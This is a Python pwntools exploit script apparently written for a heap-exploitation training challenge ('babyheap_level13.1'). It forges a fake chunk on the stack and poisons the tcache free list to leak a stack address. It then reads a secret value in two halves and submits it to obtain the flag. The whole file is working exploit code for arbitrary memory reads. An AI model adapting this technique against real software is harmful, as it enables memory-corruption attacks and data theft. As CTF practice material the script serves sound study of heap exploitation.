# idea: stack_scanf -> stack_free -> malloc * 2 -> free * 2 -> puts -> get stack_free address leak
# malloc next to be secret addr -> puts

from pwn import *
BINARY = "/challenge/babyheap_level13.1"
destance = 141
p = process(BINARY)
print(p.recv())
# leak stack addr
fake_chunk = p64(0x0) + p64(0x61) + p64(0x0) + p64(0x0)
# stack_scanf + 0x40 = stack_free
p.sendline(b'stack_scanf')
p.sendline(b'A' * 0x30 + fake_chunk)
p.sendline(b'stack_free')
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')

p.sendline(b'puts')
p.sendline(b'1')
p.recvuntil(b'Data: ')
stack_free_addr = unpack(p.recvuntil(b'\n')[:-1], 'all')
secret_addr = stack_free_addr + destance

# push secret addr to next chunk

p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')
p.sendline(b'scanf')
p.sendline(b'1')
p.sendline(p64(secret_addr))
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')
p.sendline(b'puts')
p.sendline(b'1')
p.recvuntil(b'Data: ')
secret = p.recvuntil(b'\n')[:-1]

p = process(BINARY)
print(p.recv())
# leak stack addr
fake_chunk = p64(0x0) + p64(0x61) + p64(0x0) + p64(0x0)
# stack_scanf + 0x40 = stack_free
p.sendline(b'stack_scanf')
p.sendline(b'A' * 0x30 + fake_chunk)
p.sendline(b'stack_free')
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')

p.sendline(b'puts')
p.sendline(b'1')
p.recvuntil(b'Data: ')
stack_free_addr = unpack(p.recvuntil(b'\n')[:-1], 'all')

secret_addr = stack_free_addr + destance
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')
p.sendline(b'scanf')
p.sendline(b'1')
p.sendline(p64(secret_addr+0x8))
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')

p.sendline(b'puts')
p.sendline(b'1')
p.recvuntil(b'Data: ')
secret += p.recvuntil(b'\n')[:-1]

print(secret)
p = process(BINARY)
p.sendline(b"send_flag")
p.sendline(secret)
p.interactive()